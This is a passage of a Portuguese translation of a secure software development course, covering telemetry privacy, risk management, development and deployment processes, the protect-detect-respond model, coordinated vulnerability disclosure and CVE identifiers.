link">¶</a></h1> <p>Às vezes, o software inclui funcionalidades para coletar dados de telemetria, ou seja, <strong>dados sobre como o software é usado ou funciona</strong>. Os dados de telemetria geralmente são coletados por meio de um mecanismo de "telefone para casa" incorporado ao próprio software, que os envia para outro lugar.</p> <p>Dados de telemetria são especialmente repletos de problemas de privacidade e confidencialidade.</p> <p>Os usuários finais geralmente têm a opção de compartilhar dados estatísticos com os desenvolvedores do software, mas esse acordo pode não ser adequado.</p> <p>O ideal é que os usuários finais tenham plena consciência de quais dados podem ser enviados para quais partes (incluindo o fornecedor) quando utilizam o software, e tenham a capacidade de controlar essa transferência de dados.</p> <p><em><a href=https://www.linuxfoundation.org/telemetry-data-policy/ >A Política de Coleta e Uso de Dados de Telemetria</a></em> da Linux Foundation apresenta uma breve discussão sobre algumas das questões que devem ser consideradas antes de implementar a coleta de dados de telemetria, além de discutir a abordagem da Fundação para gerenciar o uso de telemetria por suas comunidades de projetos de código aberto. Isso pode ser útil em outros contextos.</p> <h1 id=a-necessidade-de-gestao-de-riscos>A necessidade de gestão de riscos<a class=headerlink href=#a-necessidade-de-gestao-de-riscos title="Permanent link">¶</a></h1> <p>Riscos são <em>problemas potenciais</em>. A chave para desenvolver software adequadamente seguro é gerenciar os riscos de desenvolver software inseguro <em>antes que</em> eles se tornem problemas.</p> <p>Tudo na vida envolve riscos. É irreal esperar que não haja riscos. Em particular, há riscos para qualquer pessoa que use o software que você desenvolve, pois ele pode conter vulnerabilidades.</p> <p>Ao desenvolver software, é provável que você cometa erros, e alguns desses erros podem eventualmente levar a vulnerabilidades de segurança.</p> <p>Alguém pode até tentar inserir intencionalmente vulnerabilidades ou código malicioso no seu software, ou no software do qual você depende, durante o desenvolvimento. Mesmo técnicas muito robustas para combater vulnerabilidades devem se basear em suposições ou podem eliminar apenas <em>alguns</em> riscos relacionados à segurança. Portanto, novamente, é irreal esperar que não haja riscos.</p> <p>Mas, ao desenvolver software, você deve tomar medidas razoáveis ​​para <em>gerenciar</em> riscos, de modo que eles sejam tão baixos (tanto para os desenvolvedores quanto para os usuários) que sejam aceitáveis.</p> <p>Em seu livro " <em><a href=https://onlinelibrary.wiley.com/doi/book/10.1002/9781119198536>The Failure of Risk Management: Why It's Broken and How to Fix It"</a></em> (2009), Douglas Hubbard define <em>gerenciamento de riscos</em> como a <em>"identificação, avaliação e priorização de riscos... seguidas pela aplicação coordenada e econômica de recursos para minimizar, monitorar e controlar a probabilidade ou o impacto de eventos adversos"</em>.</p> <p>Um dos riscos ao desenvolver e implantar software é que invasores explorem suas vulnerabilidades e causem danos a terceiros. Não é possível impedir que invasores tentem atacar o sistema. Na verdade:</p> <p>Embora não seja possível impedir que invasores ataquem softwares, você pode dificultar o sucesso de um ataque ou reduzir o impacto caso ele seja bem-sucedido. Isso pode ser feito tomando medidas durante o desenvolvimento e a implantação do software para reduzir os riscos a um nível aceitavelmente baixo. Se o seu software for amplamente utilizado ou dependente dele para tarefas vitais, é especialmente importante que você trabalhe para gerenciar esses riscos para os seus usuários.</p> <p>Não espere para <em><strong>pensar</strong></em> nos riscos até que eles aconteçam. Assim, eles deixam de ser riscos e se tornam <strong><em>problemas</em></strong>. É mais fácil e barato lidar com os riscos <em><strong>antes que</strong></em> se tornem problemas! É muito mais fácil projetar o software para minimizar os riscos do que alterá-lo posteriormente. Também é melhor para o usuário, para a sua reputação profissional, para a reputação do software e para a reputação de qualquer organização relacionada.</p> <h1 id=processo-de-gestao-de-riscos>Processo de Gestão de Riscos<a class=headerlink href=#processo-de-gestao-de-riscos title="Permanent link">¶</a></h1> <p>Projetos pequenos com impactos relativamente baixos podem realizar a gestão de riscos informalmente.</p> <p>Projetos grandes com impactos significativos devem ser mais rigorosos. Independentemente disso, a gestão de riscos pode ser dividida nas seguintes atividades (de acordo com o <em><a href=http://acqnotes.com/wp-content/uploads/2017/07/DoD-Risk-Issue-and-Opportunity-Management-Guide-Jan-2017.pdf>Guia de Gestão de Riscos, Questões e Oportunidades para Programas de Aquisição de Defesa do</a></em> Departamento de Defesa dos EUA , 2017):</p> <ul class=task-list> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Planejamento de Riscos: Determine o processo de gerenciamento de riscos do seu projeto.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Identificação de Riscos: Identifique o que pode dar errado. Uma boa dica é procurar projetos semelhantes — quais riscos e problemas eles apresentaram? É uma boa ideia anotar essa lista para que possa ser compartilhada. Para os nossos propósitos, estamos preocupados com os riscos relacionados à segurança.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Análise de Risco: Determine os dois principais atributos de um risco: a probabilidade do evento indesejado e a gravidade de suas consequências. Um risco torna-se cada vez mais importante à medida que sua probabilidade e/ou gravidade aumentam.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Gestão de Riscos</li> </ul> <p>Determine o que você fará em relação ao risco. Você tem várias opções para cada risco:</p> <ol class=task-list> <li><strong>Aceitação (e Monitoramento)</strong> O risco é aceito, mas monitorado e comunicado às partes interessadas (incluindo seus usuários). Isso é razoável se a probabilidade ou gravidade for baixa.</li> <li><strong>Evitar:</strong> O risco é eliminado por meio de alguma alteração. Ou seja, você torna sua probabilidade zero ou sua gravidade irrelevante. Isso é ótimo quando você consegue. Por exemplo, você pode optar por não coletar alguns dados (assim, não perderá sua confidencialidade posteriormente) ou pode escolher uma linguagem de programação na qual certos tipos de vulnerabilidades não possam ocorrer (eliminando os riscos desses tipos de vulnerabilidades).</li> <li><strong>Transferência:</strong> O risco é transferido para outra pessoa (por exemplo, comprando um seguro ou alterando o sistema para que outro componente assuma esse risco e seus desenvolvedores o aceitem). Por exemplo, em vez de assumir os riscos de identificação e autenticação (I&amp;A) incorretas, confie em algum sistema existente para realizar a I&amp;A.</li> <li><strong>Controle:</strong> Reduza ativamente o risco a um nível aceitável. Como a importância de um risco depende de sua probabilidade e gravidade, isso significa mudar as coisas para reduzir a probabilidade e/ou a gravidade (ou pelo menos reduzi-las). Para riscos relacionados à segurança, isso geralmente é o que você precisa fazer. Não há uma maneira única de fazer isso, então, em vez disso, você precisa reduzir continuamente a probabilidade e a gravidade por meio do desenvolvimento e da implantação de software até que os riscos sejam aceitáveis. Por exemplo, você pode:<ol> <li>Garantir que todos os desenvolvedores saibam sobre certos tipos de erros comuns que levam a um tipo específico de vulnerabilidade (para que possam evitá-los),</li> <li>Use abordagens (como design seguro, linguagens de programação específicas e APIs) que são projetadas para tornar essas vulnerabilidades menos prováveis,</li> <li>Use ferramentas e análises para detectar erros (incluindo vulnerabilidades) e</li> <li>Fortaleça o sistema. Fortalecer um sistema significa modificá-lo para que defeitos tenham menos probabilidade de se tornarem vulnerabilidades de segurança. Discutiremos o fortalecimento neste programa de certificação profissional.</li> </ol> </li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Monitoramento de Riscos: Determine como os riscos mudaram ao longo do tempo. Com o tempo, você deve "reduzir" seus riscos — ou seja, as medidas que você está tomando devem reduzir continuamente a probabilidade ou a gravidade do risco a níveis aceitáveis.</li> </ol> <p>Gestão de riscos <em>não</em> é complicada. É basicamente senso comum.</p> <p>Mas quando você está trabalhando na resolução dos problemas atuais, é fácil esquecer os riscos, que são apenas problemas <em>potenciais</em>. Um pouco de planejamento <em>antecipado</em> pode eliminar problemas potenciais antes que se tornem problemas reais.</p> <h1 id=identificando-riscos>Identificando Riscos<a class=headerlink href=#identificando-riscos title="Permanent link">¶</a></h1> <p>Observe que o primeiro passo (além do planejamento) é identificar os riscos. Mas como identificar os riscos de vulnerabilidades de segurança? Claramente, muitas pessoas não <em>percebem</em> os riscos das vulnerabilidades de segurança.</p> <p><a href=https://www.schneier.com/blog/archives/2008/03/the_security_mi_1.html>Bruce Schneier</a> (2008) tem esta história maravilhosa:</p> <p><em>A Uncle Milton Industries vende formigueiros para crianças desde 1956. Há alguns anos, lembro-me de ter aberto um com um amigo. Não havia formigas de verdade na caixa. Em vez disso, havia um cartão que você preenchia com seu endereço, e a empresa lhe enviava algumas formigas pelo correio. Meu amigo se mostrou surpreso por poder receber formigas pelo correio. [Bruce Schneier] respondeu: 'O que é realmente interessante é que essas pessoas enviam um tubo de formigas vivas para qualquer pessoa que você indicar.'... A segurança exige uma mentalidade específica. Profissionais de segurança — pelo menos os bons — veem o mundo de forma diferente. Eles não conseguem entrar em uma loja sem perceber que podem furtar. Não conseguem usar um computador sem se perguntar sobre as vulnerabilidades de segurança. Não conseguem votar sem tentar descobrir como votar duas vezes.</em></p> <p>Essa mentalidade pode ser ensinada? Nossa experiência mostra que sim, pelo menos em parte.</p> <p>Listas de verificação, orientações e dicas ajudam a lembrar as pessoas de procurarem certas coisas, especialmente quando são construídas a partir de experiências passadas relevantes.</p> <p>Outra técnica que ajuda é trabalhar para desenvolver uma mentalidade ligeiramente paranoica.</p> <p>Não um nível clínico de paranoia, mas uma preocupação constante e discreta de que existem muitos riscos e que algumas pessoas realmente querem te pegar. Lembre-se de que alguns usuários tentarão intencionalmente causar situações raras, improváveis ​​ou inesperadas, na esperança de que tais ataques lhes concedam privilégios injustificados. Como resultado, ao escrever programas seguros, a paranoia é uma virtude. Conversar sobre riscos com outras pessoas, revisar planos com outras pessoas e procurar riscos continuamente pode ajudar a identificá-los para que possam ser tratados <em>antes que</em> se tornem problemas.</p> <h1 id=seguranca-e-um-processo-nao-um-produto>Segurança é um processo, não um produto<a class=headerlink href=#seguranca-e-um-processo-nao-um-produto title="Permanent link">¶</a></h1> <p>No seu ensaio, <em><a href=https://www.schneier.com/essays/archives/2000/04/the_process_of_secur.html>O Processo de Segurança</a></em> (2000), Bruce Schneier explicou que:</p> <p>“A segurança é um processo, não um produto… não existe segurança perfeita. Curiosamente, isso não é necessariamente um problema. … A segurança não precisa ser perfeita, mas os riscos precisam ser administráveis…”</p> <p>O mundo muda. A forma como seu software é usado muda.</p> <p>Novas vulnerabilidades são descobertas.</p> <p>A plataforma e as bibliotecas do software mudam.</p> <p>Leis, políticas e objetivos da empresa mudam.</p> <p>Um software que era seguro há um ou cinco anos pode não ser adequado hoje.</p> <p>Como a segurança é um processo, não se trata apenas de "disparar e esquecer". Você precisa considerar a segurança continuamente.</p> <h2 id=listas-de-verificacao-nao-sao-seguranca>Listas de verificação não são segurança<a class=headerlink href=#listas-de-verificacao-nao-sao-seguranca title="Permanent link">¶</a></h2> <p>Não confunda listas de verificação, diretrizes e dicas com segurança.</p> <p>Elas costumam ser <em>úteis</em> , pois podem ajudar a identificar riscos e maneiras razoáveis ​​de lidar com eles.</p> <p>Boas listas de verificação, diretrizes e dicas podem economizar muito tempo e esforço, além de serem ótimas ferramentas para ajudar outras pessoas a avaliar a segurança de alguns softwares.</p> <p>Boas listas de verificação são construídas com base na experiência de outras pessoas, e seria tolice ignorá-las.</p> <p>Mas elas são apenas auxílios para o objetivo real; não são o objetivo em si. Você pode seguir listas de verificação, diretrizes e dicas e ter um software extremamente inseguro. Você também pode <em>ignorar</em> alguns itens inadequados e ter um software muito seguro.</p> <p>Resumindo: Mas são apenas dicas; são apenas um <em>auxílio</em> para o desenvolvimento de software seguro. Ao desenvolver software, pense constantemente nas maneiras pelas quais um invasor pode tentar explorar seu sistema. Antecipe os problemas potenciais — enquanto ainda são riscos — e mitigue-os.</p> <h2 id=processos-de-desenvolvimentodefesa-em-amplitude-processos-individuais-de-desenvolvimento-e-implantacao-de-software>Processos de desenvolvimento/defesa em amplitude: processos individuais de desenvolvimento e implantação de software<a class=headerlink href=#processos-de-desenvolvimentodefesa-em-amplitude-processos-individuais-de-desenvolvimento-e-implantacao-de-software title="Permanent link">¶</a></h2> <p>Não existe um mecanismo mágico único para criar software seguro.</p> <p>Em vez disso, é preciso considerar a segurança continuamente durante o desenvolvimento e a implantação do software.</p> <p>Considerar a segurança em todos os momentos, em todos os processos de desenvolvimento e implantação, às vezes é chamado de <em>"defesa em amplitude"</em>. Então, vamos falar sobre os processos usados ​​no desenvolvimento e na implantação de software.</p> <p>Ao desenvolver software, existem certos processos que todos os desenvolvedores precisam seguir. Entre eles:</p> <ul class=task-list> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Determine <em>os requisitos</em> (o que o software deve fazer). Para garantir a segurança, certifique-se de saber quais requisitos de segurança ele precisa atender. Por exemplo, existem dados que ele deve manter confidenciais?</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Determine <em>o projeto arquitetônico</em> (como dividir o problema em componentes interativos para resolvê-lo).</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> <em>Selecione componentes reutilizáveis</em> ​​(decida quais pacotes/bibliotecas reutilizáveis ​​você usará). Você precisa avaliar os componentes que usará, pois qualquer vulnerabilidade deles pode se tornar vulnerabilidade do software que você está desenvolvendo. Esses componentes reutilizados vêm de algum lugar e dependem transitivamente de outros componentes. <strong>O conjunto de todas essas dependências, incluindo de onde vêm e como chegam até você, é a sua <em>cadeia de suprimentos</em></strong>.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> <em>Implemente</em> (escreva o código). A maioria das vulnerabilidades de segurança criadas durante a implementação são de tipos comuns específicos; depois de saber quais são, você pode evitá-las.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> <em>Verifique</em> -o (escreva/implemente testes e use analisadores para ter certeza de que ele faz o que deveria). Você deve testar para garantir que seu sistema esteja seguro e usar ferramentas para ajudar a encontrar vulnerabilidades antes que invasores as encontrem.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> <em>Implante</em>-o. Você deve ajudar a garantir que os usuários possam obter a versão correta, que ela seja segura por padrão e que possam operá-la facilmente e de forma segura.</li> </ul> <h2 id=processos-de-desenvolvimentodefesa-em-amplitude-usando-esses-processos-juntos>Processos de Desenvolvimento/Defesa em Amplitude: Usando Esses Processos Juntos<a class=headerlink href=#processos-de-desenvolvimentodefesa-em-amplitude-usando-esses-processos-juntos title="Permanent link">¶</a></h2> <p>Um erro comum é tentar executar esses processos de desenvolvimento de software em uma sequência estrita (descobrir todos os requisitos, elaborar todo o projeto, implementar o sistema inteiro e, por fim, verificá-lo).</p> <p>Tentar criar software nessa sequência estrita é chamado de <em>modelo em cascata</em>. O modelo em cascata é atraente porque executar esses processos em sequência estrita <em>parece</em> rigoroso e sensato à primeira vista. Em 1970, Winston W. Royce explicou em seu ensaio " <em><a href=https://dl.acm.org/doi/10.5555/41765.41801>Gerenciando o Desenvolvimento de Grandes Sistemas: Conceitos e Técnicas"</a></em> por que tentar seguir esses processos em uma sequência estrita (uma "cascata") é extremamente arriscado na maioria das circunstâncias e normalmente deve ser evitado.</p> <p>Outro erro comum é implementar componentes de software de forma independente e nunca integrá-los e testá-los em conjunto até que tudo esteja concluído de forma independente. Isso costuma ser um erro, pois leva a sérios problemas para que os componentes funcionem em conjunto.</p> <p>Na prática, a maior parte do desenvolvimento de software executa esses processos em paralelo, trocando informações entre eles à medida que novas informações são aprendidas. Há muitas maneiras de combinar processos, que dependem de muitos fatores, como o tamanho da equipe e a confiabilidade do resultado. Existem muitas abordagens diferentes, incluindo as diversas abordagens de desenvolvimento ágil, incremental, evolucionário e em cascata. Para os propósitos deste curso e do programa de certificação profissional, focaremos nos aspectos de segurança sempre que você optar por aplicar algum processo, e não muito nesses aspectos específicos. Portanto, você pode aplicar os materiais deste programa independentemente da abordagem utilizada. No entanto, vamos analisar algumas práticas e termos específicos que podem ser importantes para a segurança.</p> <p>Uma prática altamente recomendada é usar Integração Contínua (CI), a prática de mesclar frequentemente cópias de trabalho do desenvolvimento em uma linha principal compartilhada (por exemplo, uma vez a cada poucos dias ou várias vezes ao dia). Essa mesclagem rotineira reduz os riscos de componentes não funcionarem juntos se a integração for adiada para mais tarde, o que é positivo. No entanto, uma CI bem-sucedida requer uma maneira de determinar se os componentes estão realmente funcionando juntos. Isso é resolvido usando um pipeline de CI — um processo executado sempre que algo é mesclado para garantir que seja compilado e aprovado em um conjunto de testes automatizados e outras verificações.</p> <p>Muitas organizações desejam implementar software/serviços mais rapidamente e adotaram diversas abordagens para isso, com base nesses processos padrão de desenvolvimento de software. As definições variam, mas aqui estão alguns termos comuns:</p> <ul> <li>A Entrega Contínua (DC ou CDE) visa garantir que <em>“um aplicativo esteja sempre pronto para produção após passar com sucesso por testes automatizados e verificações de qualidade [por meio do emprego de práticas] para entregar software automaticamente a um ambiente semelhante ao de produção”</em> (Mojtaba Shahin, Muhammad Ali Babar e Liming Zhu, <em><a href=https://arxiv.org/abs/1703.07019>Integração Contínua, Entrega e Implantação: Uma Revisão Sistemática sobre Abordagens, Ferramentas, Desafios e Práticas</a></em> , 2017). Observe que o software não é necessariamente lançado ou implantado sem uma etapa de aprovação separada.</li> <li>A Implantação Contínua (DC) <em>“vai um passo além [do que a entrega contínua] e implanta o aplicativo de forma automática e contínua em ambientes de produção ou do cliente”</em> (Mojtaba Shahin, Muhammad Ali Babar e Liming Zhu, <em><a href=https://arxiv.org/abs/1703.07019>Integração Contínua, Entrega e Implantação: Uma Revisão Sistemática sobre Abordagens, Ferramentas, Desafios e Práticas</a></em> , 2017).</li> <li>O DevOps concentra-se na coordenação e cooperação entre as equipes de desenvolvimento de software (Dev) e de operações de TI (Ops) (Mike Loukides, <em><a href=https://web.archive.org/web/20230429215657/http://radar.oreilly.com/2014/06/revisiting-what-is-devops.html>Revisiting "What Is DevOps"</a></em> , 2014), por exemplo, para reduzir o tempo de desenvolvimento e implantação. Na prática, isso normalmente inclui Entrega Contínua (CDE) e pode incluir Implantação Contínua (CD).</li> <li>DevSecOps (também chamado de SecDevOps) é DevOps, mas especificamente integra preocupações de segurança no processo de desenvolvimento e operações (Red Hat, <em><a href=https://www.redhat.com/en/topics/devops/what-is-devsecops>O que é DevSecOps?</a></em> ).</li> <li>GitOps <em>"é uma forma de implementar a Implantação Contínua para aplicações nativas da nuvem. Ele se concentra em uma experiência centrada no desenvolvedor ao operar a infraestrutura, usando ferramentas com as quais os desenvolvedores já estão familiarizados, incluindo Git e ferramentas de Implantação Contínua. A ideia central do GitOps é ter um repositório Git que sempre contenha descrições declarativas da infraestrutura atualmente desejada no ambiente de produção e um processo automatizado para fazer com que o ambiente de produção corresponda ao estado descrito no repositório. Se você deseja implantar uma nova aplicação ou atualizar uma existente, basta atualizar o repositório - o processo automatizado cuida de todo o resto",</em> segundo <a href=https://www.gitops.tech/ >o site gitops.tech</a>. Definições semelhantes são <em>"O GitOps usa repositórios Git como uma única fonte de verdade para entregar infraestrutura como código"</em> (Red Hat, <a href=https://www.redhat.com/en/topics/devops/what-is-gitops>O que é GitOps?</a> ) e <em>"O GitOps é uma estrutura operacional que utiliza as melhores práticas de DevOps usadas para desenvolvimento de aplicações, como controle de versão, colaboração, conformidade e CI/CD, e as aplica à automação da infraestrutura"</em> (GitLab, <a href=https://about.gitlab.com/topics/gitops/ >O que é GitOps?</a> ).</li> </ul> <p>Tudo isso depende de testes automatizados e verificações de qualidade e, do ponto de vista da segurança, o fundamental é que ferramentas para verificar vulnerabilidades e potenciais problemas de segurança sejam integradas a esses testes automatizados e verificações de qualidade. Por exemplo, você deve garantir que haja ferramentas em seu pipeline de CI que verifiquem diversos problemas de segurança, para que quaisquer problemas de segurança sejam detectados precocemente. Ferramentas de segurança que demoram muito para serem executadas podem ser executadas em paralelo, mas podem ser usadas como uma "porta de entrada" para o CDE. Discutiremos muito mais sobre ferramentas para oferecer suporte à segurança posteriormente neste curso e em outros cursos do programa de certificação profissional Fundamentos do Desenvolvimento de Software Seguro.</p> <p>A simples inserção de algumas "ferramentas de segurança" em um conjunto de testes automatizados, por si só, tende a ser ineficaz. Ferramentas de segurança geralmente não sabem o que o software deve fazer (os requisitos). Por exemplo, ferramentas de segurança não sabem quais informações são confidenciais. Ferramentas de segurança geralmente não conseguem detectar problemas fundamentais no design do software e, mesmo que pudessem, corrigir problemas de design não é o que as ferramentas de detecção fazem. Ferramentas de segurança frequentemente deixam passar vulnerabilidades, especialmente se o software for mal projetado. E talvez o mais importante, as informações de ferramentas de segurança geralmente não fazem sentido para os desenvolvedores se eles não tiverem um conhecimento básico sobre segurança. Existe uma velha frase que ainda é verdadeira: <em>"um tolo com uma ferramenta ainda é um tolo"</em>.</p> <p><strong>Resumindo:</strong> Ferramentas são importantes, mas não o suficiente.</p> <p>Você deve considerar continuamente a segurança durante o desenvolvimento e a implantação, independentemente do que esteja fazendo, para poder identificar e lidar com riscos relacionados à segurança. Considere como seu sistema pode ser atacado (identificando seus riscos), analise os riscos para determinar a probabilidade de o sistema ser explorado e a gravidade, se for o caso, e então decida o que fazer. Isso definitivamente inclui adicionar ferramentas de segurança ao seu pipeline de integração contínua, mas essas ferramentas serão muito mais eficazes se você pensar na segurança durante o desenvolvimento e a implantação. No restante deste curso e programa, abordaremos como fazer isso. Eventualmente, discutiremos as ferramentas, mas somente depois de entendermos o que elas estão nos ajudando a fazer.</p> <p>Você também deve se concentrar na melhoria contínua, tanto do software em si quanto dos processos usados ​​para desenvolvê-lo. Se o design ou a API atual forem difíceis de usar com segurança, facilite o uso seguro. Procure maneiras de proteger o software contra ataques. Modifique os processos de verificação adicionando novas ferramentas ou alterando a configuração das ferramentas existentes para detectar cada vez mais problemas antes que eles sejam liberados para os usuários.</p> <h2 id=proteger-detectar-responder>Proteger, Detectar, Responder<a class=headerlink href=#proteger-detectar-responder title="Permanent link">¶</a></h2> <p>O software é desenvolvido para ser usado, então vamos analisar brevemente a segurança do ponto de vista das operações.</p> <p>As organizações não devem presumir que sempre podem proteger seus sistemas contra ataques. Às vezes, invasores conseguem se infiltrar. Por exemplo, o <a href=https://www.nist.gov/cyberframework>NIST Cybersecurity Framework dos EUA</a> identifica cinco funções simultâneas e contínuas que as organizações devem aplicar em suas operações para gerenciar riscos de segurança cibernética:</p> <table> <thead> <tr> <th></th> <th></th> </tr> </thead> <tbody> <tr> <td>Identificar</td> <td><em>"Desenvolver uma compreensão organizacional para gerenciar riscos de segurança cibernética para sistemas, pessoas, ativos, dados e capacidades".</em></td> </tr> <tr> <td>Proteger</td> <td><em>"Desenvolver e implementar salvaguardas apropriadas para garantir a prestação de serviços críticos".</em></td> </tr> <tr> <td>Detectar</td> <td><em>"Desenvolver e implementar atividades apropriadas para identificar a ocorrência de um evento de segurança cibernética".</em></td> </tr> <tr> <td>Responder</td> <td><em>"Desenvolver e implementar atividades apropriadas para tomar medidas em relação a um incidente de segurança cibernética detectado"</em></td> </tr> <tr> <td>Recuperar</td> <td><em>"Desenvolver e implementar atividades apropriadas para manter planos de resiliência e restaurar quaisquer capacidades ou serviços que foram prejudicados devido a um incidente de segurança cibernética".</em></td> </tr> <tr> <td>Esta lista de cinco funções às vezes é simplificada para três funções básicas: <strong>proteger</strong> , <strong>detectar</strong> e <strong>responder</strong>.</td> <td></td> </tr> </tbody> </table> <p>Ao usar esta lista simplificada de três funções básicas, identificar é considerado parte de proteger e recuperar é considerado parte de responder. Usaremos essa lista resumida de funções básicas aqui.</p> <p>Nenhuma dessas três funções básicas (proteger, detectar e responder) é eficaz por si só. Se você apenas proteger, mas não detectar ou recuperar, um invasor que romper suas defesas poderá fazer o que quiser. Se você apenas detectar ou recuperar, sem proteger seu sistema, nunca conseguirá realizar nenhum trabalho; em vez disso, gastará todo o seu tempo em detecção ou recuperação e, em breve, ninguém confiará em seu sistema. Além disso, a recuperação é inútil sem detecção, porque muitas vezes você não sabe <em>quando</em> se recuperar.</p> <p>Falaremos bastante sobre medidas de proteção. Normalmente, é mais barato prevenir problemas do que lidar com eles mais tarde (velhos provérbios se aplicam aqui, como, por exemplo, <em>"é melhor prevenir do que remediar"</em> ). Mas também discutiremos medidas para detectar e responder, porque elas também são necessárias. No mínimo, aplicativos maiores devem incluir mecanismos como registro (para auxiliar na detecção) e backup (para auxiliar na recuperação), porque são necessários nos aplicativos que implementamos.</p> <h2 id=vulnerabilidades>Vulnerabilidades<a class=headerlink href=#vulnerabilidades title="Permanent link">¶</a></h2> <p>Uma vulnerabilidade é simplesmente a falha em atender a algum requisito de segurança.</p> <p>Normalmente, as vulnerabilidades não são intencionais, mas podem ser intencionais. Por exemplo, alguém pode ter inserido intencionalmente código malicioso (ou pelo menos tentado fazê-lo) no software que você reutiliza ou desenvolve, como um backdoor (uma forma de obter acesso não autorizado) ou uma bomba lógica (código que executa uma função maliciosa quando condições especificadas são atendidas). Este curso e programa de certificação profissional se concentram estritamente em software, embora, é claro, hardware também possa apresentar vulnerabilidades.</p> <p>A sociedade moderna depende de software (e hardware) e, como resultado, houve um crescimento massivo no número de vulnerabilidades publicamente conhecidas. Isso tornou difícil responder a perguntas simples como <em>"você corrigiu esta vulnerabilidade específica?"</em>.</p> <p>A seguir, descreveremos alguns esforços que foram feitos para identificar e corrigir vulnerabilidades conhecidas.</p> <h2 id=relatando-e-lidando-com-vulnerabilidades-um-breve-resumo>Relatando e lidando com vulnerabilidades: um breve resumo<a class=headerlink href=#relatando-e-lidando-com-vulnerabilidades-um-breve-resumo title="Permanent link">¶</a></h2> <p>Muitas pessoas, por um motivo ou outro, encontraram vulnerabilidades de segurança em softwares.</p> <p>Alguns, chamados pesquisadores de segurança, fazem da descoberta de vulnerabilidades parte de sua carreira.</p> <p>Na maioria dos casos, esses localizadores de vulnerabilidades relatam a vulnerabilidade ao(s) fornecedor(es) de software por meio de um processo de <em>"divulgação coordenada e programada"</em>.</p> <p>Os localizadores relatam a vulnerabilidade de forma privada ao(s) fornecedor(es), concedendo a este(s) um prazo limitado (chamado de <em>"tempo de embargo"</em> ) para corrigir a vulnerabilidade.</p> <p>Após esse prazo (normalmente de 14 a 90 dias), ou quando a vulnerabilidade for corrigida e os usuários tiverem a oportunidade de instalar a versão atualizada do software, a vulnerabilidade é divulgada publicamente.</p> <p>Às vezes, esse processo é chamado apenas de <em>"divulgação coordenada"</em> , mas queremos deixar claro que, nesse processo, a vulnerabilidade será divulgada publicamente se o fornecedor não a corrigir em tempo hábil.</p> <p>Na prática, as coisas são mais complicadas. Muitas vezes, há vários fornecedores e outras partes interessadas envolvidas.</p> <p>É extremamente importante que você (como desenvolvedor/fornecedor) se prepare com antecedência para que as pessoas possam facilmente relatar vulnerabilidades a você, para que você possa discutir o problema em particular com partes confiáveis ​​e para que possa corrigir rapidamente quaisquer problemas.</p> <p>Mais adiante, neste programa de certificação profissional, discutiremos mais detalhadamente como aceitar e relatar vulnerabilidades, incluindo referências a documentos úteis sobre elas. Além disso, há tanto software e tantas vulnerabilidades que há a necessidade de rastreá-las.</p> <p>Essa necessidade de rastreamento levou à criação de algo chamado <em>Vulnerabilidades e Exposições Comuns (CVE)</em>.</p> <h2 id=vulnerabilidades-e-exposicoes-comuns-cves>Vulnerabilidades e Exposições Comuns (CVEs)<a class=headerlink href=#vulnerabilidades-e-exposicoes-comuns-cves title="Permanent link">¶</a></h2> <p>Common Vulnerabilities and Exposures (CVE) é um dicionário global de (algumas) vulnerabilidades de segurança cibernética divulgadas publicamente. O objetivo do CVE é facilitar o compartilhamento de dados sobre vulnerabilidades.</p> <p>Uma entrada CVE tem um número de identificação (ID), descrição e pelo menos uma referência pública. Os IDs CVE têm o formato CVE- <em>ano</em>-<em>número</em> , onde <em>ano</em> é o ano em que foi relatado e <em>número</em> é um inteiro positivo arbitrário para garantir que os IDs CVE sejam únicos.</p> <p>Por exemplo, <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160">CVE-2014-0160</a> é uma vulnerabilidade específica no OpenSSL (chamada de vulnerabilidade Heartbleed) que foi relatada pela primeira vez em 2014. Existem bancos de dados, como o <a href=https://nvd.nist.gov/ >US National Vulnerability Database (NVD)</a> , que rastreiam o conjunto público atual de entradas CVE.</p> <p>Os CVEs são atribuídos por uma Autoridade de Numeração de CVE (CNA).</p> <p>Uma CNA é simplesmente uma organização autorizada a atribuir IDs de CVE a vulnerabilidades que afetam produtos dentro de um escopo definido previamente.</p> <p>O CNA principal (também conhecido como "CNA de último recurso") pode atribuir um CVE mesmo que ninguém mais possa (essa função é atualmente preenchida pelo <a href=https://www.mitre.org/ >MITRE</a> ). Muitos CNAs são desenvolvedores de produtos de software (como Microsoft e Red Hat) que atribuem números de CVE para seus próprios produtos. Há também coordenadores terceirizados para vulnerabilidades, como o <a href=https://sei.cmu.edu/about/divisions/cert/index.cfm>Centro de Coordenação CERT</a> , que são CNAs.</p> <p>Cada CNA recebe um bloco de inteiros que pode usar em CVEs. Isso significa que CVE-2025-50000 não significa que seja a vulnerabilidade número 50.000 no ano de 2025, mas apenas que o CNA que atribuiu esse ID de CVE estava autorizado a atribuir 50.000 no ano de 2025.</p> <p>Muitas vulnerabilidades publicamente conhecidas não possuem atribuições de CVE.</p> <p>Primeiramente, CVEs são atribuídas somente se alguém solicitar uma atribuição de um CNA; se nenhuma solicitação for feita, não haverá CVE.</p> <p>Além disso, CVEs são intencionalmente limitados em escopo. CVEs são concedidos somente para software que foi lançado publicamente (incluindo pré-lançamentos, se forem amplamente utilizados).</p> <p>CVEs geralmente não são atribuídos a softwares personalizados que não são distribuídos. Eles também não são normalmente atribuídos a serviços online.</p> <p>Dito isso, CVEs são o método mais amplamente utilizado para fornecer um identificador exclusivo para cada vulnerabilidade publicamente conhecida, por isso é importante conhecê-los.</p> <h2 id=principais-tipos-de-vulnerabilidades>Principais tipos de vulnerabilidades<a class=headerlink href=#principais-tipos-de-vulnerabilidades title="Permanent link">¶</a></h2> <p>A grande maioria das 